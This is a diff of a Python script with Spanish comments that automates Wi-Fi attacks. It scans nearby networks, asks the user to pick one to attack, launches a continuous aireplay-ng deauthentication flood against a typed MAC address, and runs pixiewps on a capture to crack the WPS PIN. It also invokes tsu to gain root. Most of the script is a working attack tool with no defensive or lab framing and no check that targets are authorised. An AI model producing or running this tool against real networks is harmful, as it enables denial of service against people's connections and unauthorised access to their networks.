@@ -1,6 +1,5 @@
 import subprocess
 import time
-import sys
 
 def run_command(command):
     """Ejecuta un comando de shell y muestra la salida"""
@@ -14,38 +13,77 @@ def run_command(command):
 
 def scan_wifi():
     """Escanear redes Wi-Fi cercanas"""
-    print("Escaneando redes Wi-Fi...")
-    output = run_command("iw dev wlan0 scan | grep SSID")
-    print(output)
+    print("Escaneando redes Wi-Fi...\n")
+    result = run_command("iw dev wlan0 scan | grep SSID | awk -F ':' '{print $2}'")
+    if not result:
+        print("No se encontraron redes.")
+        return []
+    networks = result.strip().split("\n")
+    networks = [net.strip() for net in networks if net.strip()]
+    
+    # Mostrar redes de forma atractiva
+    print("Redes Wi-Fi encontradas:")
+    for idx, network in enumerate(networks, 1):
+        print(f"{idx}. {network}")
+    
+    return networks
 
-def deauth_attack(target_mac, iface="wlan0"):
+def select_network(networks):
+    """Permitir al usuario seleccionar una red"""
+    if not networks:
+        print("No hay redes disponibles para seleccionar.")
+        return None
+    
+    while True:
+        try:
+            choice = int(input("\nSelecciona el número de la red que deseas atacar: "))
+            if 1 <= choice <= len(networks):
+                return networks[choice - 1]
+            else:
+                print("Número fuera de rango. Intenta nuevamente.")
+        except ValueError:
+            print("Por favor, ingresa un número válido.")
+
+def deauth_attack(target_mac):
     """Realizar un ataque de desautenticación"""
-    print(f"Realizando ataque de desautenticación contra {target_mac}...")
-    output = run_command(f"sudo aireplay-ng --deauth 0 -a {target_mac} {iface}")
-    print(output)
+    print(f"Realizando ataque de desautenticación contra {target_mac}...\n")
+    run_command(f"sudo aireplay-ng --deauth 0 -a {target_mac} wlan0")
+    print("Ataque de desautenticación finalizado.\n")
 
 def pixiewps_attack(target_pcap):
     """Realizar un ataque Pixiewps sobre un archivo pcap"""
-    print(f"Realizando ataque Pixiewps sobre {target_pcap}...")
-    output = run_command(f"pixiewps -r {target_pcap} -o cracked.txt")
-    print(output)
+    print(f"Realizando ataque Pixiewps sobre {target_pcap}...\n")
+    run_command(f"pixiewps -r {target_pcap} -o cracked.txt")
+    print("Ataque Pixiewps finalizado.\n")
 
 def main():
-    print("Iniciando auditoría Wi-Fi...\n")
+    # Asegurarse de tener permisos de superusuario
+    run_command("tsu")
     
     # Escanear redes Wi-Fi
-    scan_wifi()
-
-    # Introduce la MAC del objetivo para el ataque de desautenticación
-    target_mac = input("Introduce la MAC del objetivo para desautenticación (por ejemplo, 00:11:22:33:44:55): ")
-    deauth_attack(target_mac)
-
-    # Realizar ataque Pixiewps
-    target_pcap = input("Introduce el archivo pcap para Pixiewps (por ejemplo, captura.pcap): ")
-    pixiewps_attack(target_pcap)
+    networks = scan_wifi()
+    
+    # Si no hay redes disponibles, terminar el script
+    if not networks:
+        return
+    
+    # Seleccionar la red
+    target_network = select_network(networks)
+    
+    if target_network:
+        print(f"\nHas seleccionado la red: {target_network}")
+    
+        # Esperar y hacer el ataque de desautenticación (Ejemplo con MAC)
+        target_mac = input("Introduce la MAC del objetivo para desautenticación (de la red seleccionada): ")
+        deauth_attack(target_mac)
+        
+        # Realizar ataque Pixiewps
+        target_pcap = input("Introduce el archivo pcap para Pixiewps: ")
+        pixiewps_attack(target_pcap)
 
 if __name__ == "__main__":
     main()
+
 
 
 
